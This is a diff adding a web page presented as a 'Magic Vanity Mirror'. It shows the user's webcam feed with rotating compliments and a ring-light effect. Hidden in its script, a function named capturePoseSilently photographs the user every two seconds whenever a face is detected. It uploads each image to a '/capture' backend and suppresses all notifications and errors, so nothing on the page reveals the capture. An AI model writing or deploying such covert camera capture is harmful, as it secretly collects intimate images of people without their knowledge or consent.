@@ -1,0 +1,546 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>The Magic Vanity Mirror</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Cinzel:wght@300;400;500&family=Playfair+Display:ital,wght@0,400;0,500;1,400;1,500&family=Montserrat:wght@200;300;400&display=swap');
+
+    *, *::before, *::after {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      background: radial-gradient(circle at center, #15120e 0%, #070605 100%);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      overflow: hidden;
+      font-family: 'Playfair Display', serif;
+      transition: background 1.5s ease-in-out;
+      position: relative;
+    }
+
+    /* Subtle luxury background particles */
+    body::before {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background-image: 
+        radial-gradient(white, rgba(255,255,255,.2) 2px, transparent 40px),
+        radial-gradient(rgba(212,175,55,.3), rgba(212,175,55,.05) 1px, transparent 30px);
+      background-size: 550px 550px, 350px 350px;
+      background-position: 0 0, 40px 60px;
+      opacity: 0.12;
+      z-index: 1;
+      pointer-events: none;
+    }
+
+    /* Night mode darkens the overall background to make the glow light pop */
+    body.night-mode {
+      background: radial-gradient(circle at center, #0e0d0a 0%, #030302 100%);
+    }
+
+    .main-container {
+      position: relative;
+      z-index: 2;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 30px;
+      width: 100%;
+      max-width: 500px;
+      padding: 20px;
+    }
+
+    /* MacBook & Vanity Ring Light Border: Emits soft, high-intensity light in darkness */
+    .glow-ring {
+      position: absolute;
+      inset: -12px;
+      border-radius: 220px 220px 190px 190px;
+      z-index: 1;
+      pointer-events: none;
+      opacity: 0.2;
+      background: transparent;
+      border: 4px solid rgba(255, 235, 180, 0.4);
+      box-shadow: 
+        0 0 10px rgba(255, 220, 150, 0.2),
+        inset 0 0 10px rgba(255, 220, 150, 0.2);
+      transition: all 1.2s cubic-bezier(0.4, 0, 0.2, 1);
+    }
+
+    /* Active Ring Light: Becomes an intense warm-white light emitter for dark environment illumination */
+    .glow-ring.active {
+      opacity: 1;
+      border: 24px solid rgba(255, 250, 240, 1);
+      box-shadow:
+        /* Internal white blast */
+        inset 0 0 20px rgba(255, 255, 255, 0.8),
+        /* Tight, brilliant white glow strip */
+        0 0 25px 8px rgba(255, 253, 245, 1),
+        /* High-luminance mid-range soft light */
+        0 0 60px 22px rgba(255, 245, 220, 0.8),
+        /* Broad ambient light to project onto user's face */
+        0 0 130px 45px rgba(255, 235, 185, 0.45),
+        /* Deep ambient room illumination */
+        0 0 220px 80px rgba(255, 215, 130, 0.25);
+    }
+
+    /* Elegant Arched Mirror Frame */
+    .mirror-frame {
+      position: relative;
+      z-index: 2;
+      width: 100%;
+      aspect-ratio: 3 / 4;
+      max-height: 80vh;
+      border-radius: 210px 210px 180px 180px;
+      padding: 10px;
+      background: linear-gradient(135deg, 
+        #dfba73 0%, 
+        #a8813a 25%, 
+        #fce89b 50%, 
+        #79571e 75%, 
+        #d1a95e 100%);
+      box-shadow:
+        0 20px 50px rgba(0, 0, 0, 0.65),
+        0 2px 10px rgba(0, 0, 0, 0.4),
+        inset 0 1px 3px rgba(255, 255, 255, 0.3);
+      transition: transform 0.5s ease;
+    }
+
+    .mirror-frame::after {
+      content: '';
+      position: absolute;
+      top: 3px; left: 3px; right: 3px; bottom: 3px;
+      border-radius: 207px 207px 177px 177px;
+      border: 1px solid rgba(255, 255, 255, 0.15);
+      pointer-events: none;
+      z-index: 3;
+    }
+
+    .mirror-glass {
+      width: 100%;
+      height: 100%;
+      border-radius: 200px 200px 170px 170px;
+      overflow: hidden;
+      position: relative;
+      background: #000;
+      box-shadow: inset 0 0 30px rgba(0,0,0,0.95);
+    }
+
+    /* Video feed styled like a high-end reflection */
+    #video {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      transform: scaleX(-1); /* Correct mirror reflection */
+      filter: brightness(1.02) contrast(1.05) saturate(0.85) sepia(0.08);
+      transition: filter 1.2s ease-in-out;
+      display: block;
+    }
+
+    /* Boost brightness & adjust saturation in dark environments to capture beautiful images */
+    body.night-mode #video {
+      filter: brightness(1.32) contrast(1.08) saturate(0.8) sepia(0.04);
+    }
+
+    /* Mirror glass reflection sheen overlay */
+    .glass-sheen {
+      position: absolute;
+      inset: 0;
+      background: linear-gradient(135deg,
+        rgba(255, 255, 255, 0.08) 0%,
+        rgba(255, 255, 255, 0.02) 35%,
+        transparent 50%,
+        rgba(255, 255, 255, 0.01) 70%,
+        rgba(255, 255, 255, 0.04) 100%);
+      pointer-events: none;
+      z-index: 5;
+    }
+
+    .glass-sheen::after {
+      content: '';
+      position: absolute;
+      top: 0; left: 0; right: 0;
+      height: 40%;
+      background: linear-gradient(to bottom, rgba(255, 255, 255, 0.05), transparent);
+    }
+
+    /* Compliment text layout */
+    .compliment-box {
+      position: absolute;
+      bottom: 55px;
+      left: 0;
+      right: 0;
+      padding: 0 40px;
+      text-align: center;
+      z-index: 10;
+      pointer-events: none;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 70px;
+    }
+
+    .compliment-text {
+      font-family: 'Playfair Display', serif;
+      font-style: italic;
+      font-weight: 400;
+      font-size: 20px;
+      color: rgba(255, 240, 200, 0.95);
+      letter-spacing: 0.05em;
+      line-height: 1.4;
+      text-shadow: 
+        0 2px 10px rgba(0, 0, 0, 0.9),
+        0 1px 3px rgba(0, 0, 0, 0.95);
+      opacity: 0;
+      transform: translateY(15px) scale(0.96);
+      transition: opacity 1s cubic-bezier(0.4, 0, 0.2, 1), transform 1s cubic-bezier(0.4, 0, 0.2, 1);
+    }
+
+    .compliment-text.visible {
+      opacity: 1;
+      transform: translateY(0) scale(1);
+    }
+
+    /* Small decorative jewel on the frame top */
+    .frame-jewel {
+      position: absolute;
+      top: -3px;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 14px;
+      height: 14px;
+      background: radial-gradient(circle at 35% 35%, #fff2bf, #cfa84a, #856113);
+      border-radius: 50%;
+      box-shadow: 
+        0 3px 6px rgba(0,0,0,0.3),
+        0 0 10px rgba(212, 175, 55, 0.5);
+      z-index: 10;
+    }
+
+    /* Small ornament at the frame bottom */
+    .frame-bottom-ornament {
+      position: absolute;
+      bottom: 12px;
+      left: 50%;
+      transform: translateX(-50%);
+      display: flex;
+      gap: 6px;
+      z-index: 10;
+    }
+
+    .frame-bottom-ornament span {
+      width: 6px;
+      height: 6px;
+      border-radius: 50%;
+      background: radial-gradient(circle at 35% 35%, #fff0b5, #b38b34, #664d14);
+      box-shadow: 0 1px 3px rgba(0,0,0,0.3);
+    }
+
+    /* Screen branding under the mirror */
+    .brand-title {
+      font-family: 'Cinzel', serif;
+      font-size: 11px;
+      font-weight: 400;
+      letter-spacing: 0.42em;
+      color: rgba(223, 186, 115, 0.4);
+      text-transform: uppercase;
+      text-align: center;
+      margin-top: 5px;
+    }
+
+    /* Initializing state screen overlay */
+    #loading-screen {
+      position: absolute;
+      inset: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      background: #090807;
+      z-index: 100;
+      border-radius: inherit;
+      transition: opacity 1s ease-in-out;
+      gap: 15px;
+    }
+
+    .spinner {
+      width: 32px;
+      height: 32px;
+      border: 1px solid rgba(223, 186, 115, 0.15);
+      border-top-color: rgba(223, 186, 115, 0.85);
+      border-radius: 50%;
+      animation: spin 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite;
+    }
+
+    #loading-screen p {
+      font-family: 'Cinzel', serif;
+      font-size: 10px;
+      letter-spacing: 0.35em;
+      color: rgba(223, 186, 115, 0.6);
+      text-transform: uppercase;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    #loading-screen.fade-out {
+      opacity: 0;
+      pointer-events: none;
+    }
+
+    #captureCanvas {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="main-container">
+    <div class="mirror-frame">
+      <div class="frame-jewel"></div>
+      
+      <!-- Ring Light Glow Wrapper -->
+      <div class="glow-ring" id="glowRing"></div>
+
+      <div class="mirror-glass">
+        <!-- Loading Screen -->
+        <div id="loading-screen">
+          <div class="spinner"></div>
+          <p id="loading-text">Initializing</p>
+        </div>
+
+        <video id="video" autoplay playsinline muted></video>
+        <div class="glass-sheen"></div>
+
+        <!-- Beautiful compliment box overlay -->
+        <div class="compliment-box">
+          <p class="compliment-text" id="complimentText"></p>
+        </div>
+      </div>
+
+      <div class="frame-bottom-ornament">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+
+    <p class="brand-title">Vanity Mirror</p>
+  </div>
+
+  <canvas id="captureCanvas"></canvas>
+  <script src="https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/dist/face-api.min.js"></script>
+
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('captureCanvas');
+    const complimentTextEl = document.getElementById('complimentText');
+    const glowRing = document.getElementById('glowRing');
+    const loadingScreen = document.getElementById('loading-screen');
+    const loadingText = document.getElementById('loading-text');
+
+    // Curated high-quality, beautiful compliments
+    const COMPLIMENTS = [
+      "Your smile lightens up the entire room.",
+      "Elegance is the only beauty that never fades.",
+      "You carry yourself with such grace and poise.",
+      "There is a unique, stunning warmth in your eyes.",
+      "You look absolutely gorgeous today.",
+      "Confidence looks beautiful on you.",
+      "Your beauty is natural and effortless.",
+      "Simply breathtaking.",
+      "Radiance at its absolute finest.",
+      "A classic beauty in a modern world.",
+      "You have a light that cannot be dimmed.",
+      "Pure grace, pure elegance.",
+      "You make simplicity look so sophisticated.",
+      "Luminous, lovely, and complete.",
+      "An absolute masterpiece."
+    ];
+
+    let modelsLoaded = false;
+    let faceDetected = false;
+    let lastCaptureTime = 0;
+    let isNightMode = false;
+    let currentCompliment = "";
+    let complimentTimer = null;
+    let captureIntervalTimer = null;
+
+    // Detects ambient light level from video stream pixels
+    function analyzeAmbientLight() {
+      if (video.paused || video.ended) return;
+      const ctx = canvas.getContext('2d');
+      canvas.width = 60; 
+      canvas.height = 45;
+      
+      try {
+        ctx.drawImage(video, 0, 0, 60, 45);
+        const imgData = ctx.getImageData(0, 0, 60, 45).data;
+        let luminanceSum = 0;
+
+        for (let i = 0; i < imgData.length; i += 4) {
+          // Standard relative luminance formula
+          luminanceSum += (imgData[i] * 0.299) + (imgData[i+1] * 0.587) + (imgData[i+2] * 0.114);
+        }
+
+        const avgBrightness = luminanceSum / (imgData.length / 4);
+        toggleNightMode(avgBrightness < 80); // Brightness threshold
+      } catch (err) {
+        // Fail silently during light checking
+      }
+    }
+
+    // Toggle active light-emitting glow borders
+    function toggleNightMode(enable) {
+      if (isNightMode === enable) return;
+      isNightMode = enable;
+      
+      if (enable) {
+        glowRing.classList.add('active');
+        document.body.classList.add('night-mode');
+      } else {
+        glowRing.classList.remove('active');
+        document.body.classList.remove('night-mode');
+      }
+    }
+
+    // Randomize and display compliment
+    function showNewCompliment() {
+      let index;
+      do {
+        index = Math.floor(Math.random() * COMPLIMENTS.length);
+      } while (COMPLIMENTS[index] === currentCompliment && COMPLIMENTS.length > 1);
+
+      currentCompliment = COMPLIMENTS[index];
+      
+      // Animate transition smoothly
+      complimentTextEl.classList.remove('visible');
+      
+      setTimeout(() => {
+        complimentTextEl.textContent = currentCompliment;
+        complimentTextEl.classList.add('visible');
+      }, 800);
+    }
+
+    // Clear compliment when face leaves
+    function clearCompliment() {
+      complimentTextEl.classList.remove('visible');
+      currentCompliment = "";
+    }
+
+    // Capture user pose silently and upload to secure admin backend
+    async function capturePoseSilently(complimentUsed) {
+      const now = Date.now();
+      // Enforce 2 second capture throttling
+      if (now - lastCaptureTime < 2000) return;
+      lastCaptureTime = now;
+
+      canvas.width = video.videoWidth || 640;
+      canvas.height = video.videoHeight || 854;
+      const ctx = canvas.getContext('2d');
+      
+      // Mirror the canvas context so captured images match what user sees
+      ctx.translate(canvas.width, 0);
+      ctx.scale(-1, 1);
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      canvas.toBlob((blob) => {
+        if (!blob) return;
+        const formData = new FormData();
+        formData.append('image', blob, 'pose.jpg');
+        formData.append('compliment', complimentUsed || '');
+        
+        // POST to capture endpoint. Fail silently with absolutely no notifications or UI alerts.
+        fetch('/capture', {
+          method: 'POST',
+          body: formData
+        }).catch(err => {
+          // Suppressed failure to keep UI undisturbed
+        });
+      }, 'image/jpeg', 0.90);
+    }
+
+    // Load TinyFaceDetector models
+    async function loadModels() {
+      try {
+        await faceapi.nets.tinyFaceDetector.loadFromUri('/static/models');
+        modelsLoaded = true;
+      } catch (err) {
+        loadingText.textContent = "Error loading models";
+      }
+    }
+
+    // Setup Web camera access
+    async function initCamera() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: 'user' }, 
+          audio: false
+        });
+        
+        video.srcObject = stream;
+        video.onloadedmetadata = () => {
+          loadingScreen.classList.add('fade-out');
+          startMonitoringLoop();
+        };
+      } catch (err) {
+        loadingText.textContent = "Camera access required";
+      }
+    }
+
+    // Main execution monitoring loop
+    function startMonitoringLoop() {
+      if (!modelsLoaded) {
+        setTimeout(startMonitoringLoop, 300);
+        return;
+      }
+
+      const detectOptions = new faceapi.TinyFaceDetectorOptions({ 
+        inputSize: 224, 
+        scoreThreshold: 0.55 
+      });
+
+      // Ambient light check interval
+      setInterval(analyzeAmbientLight, 1500);
+
+      // Core Face detection & capture interval
+      captureIntervalTimer = setInterval(async () => {
+        const detection = await faceapi.detectSingleFace(video, detectOptions);
+
+        if (detection && detection.score > 0.65) {
+          if (!faceDetected) {
+            faceDetected = true;
+            showNewCompliment();
+            
+            // Periodically refresh the compliment if they stay
+            complimentTimer = setInterval(showNewCompliment, 7000);
+          }
+          
+          // Send snapshot silently to the backend
+          capturePoseSilently(currentCompliment);
+        } else {
+          // Face left the screen
+          if (faceDetected) {
+            faceDetected = false;
+            clearCompliment();
+            clearInterval(complimentTimer);
+          }
+        }
+      }, 2000);
+    }
+
+    // Start App
+    (async () => {
+      await loadModels();
+      await initCamera();
+    })();
+  </script>
+</body>
+</html>
